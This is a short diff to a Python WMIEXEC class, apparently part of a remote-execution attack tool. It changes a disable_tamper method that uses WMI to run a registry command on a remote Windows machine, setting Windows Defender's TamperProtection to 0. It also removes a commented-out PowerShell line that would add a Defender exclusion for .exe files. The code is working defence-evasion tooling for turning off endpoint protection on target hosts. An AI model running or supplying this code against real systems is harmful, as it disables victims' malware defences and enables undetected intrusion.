@@ -239,8 +239,8 @@ class WMIEXEC:
         time.sleep(8)
 
     def disable_tamper(self):
-        command = self.__shell + 'REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\Windows Defender\\Features\\TamperProtection^" /v ^"Enabled^" /d ^"0^" /t REG_DWORD /F" """'
-        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".exe""'
+        command = self.__shell + 'REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\Windows Defender\\Features^" /v ^"TamperProtection^" /d ^"0^" /t REG_DWORD /F" """'
+        # reg add keyname /v value /t type /d 0 /f 
 
         logging.debug('wmi Disabling TamperProtection using: ' + command)
         self.__win32Process.Create(command, self.__pwd, None)
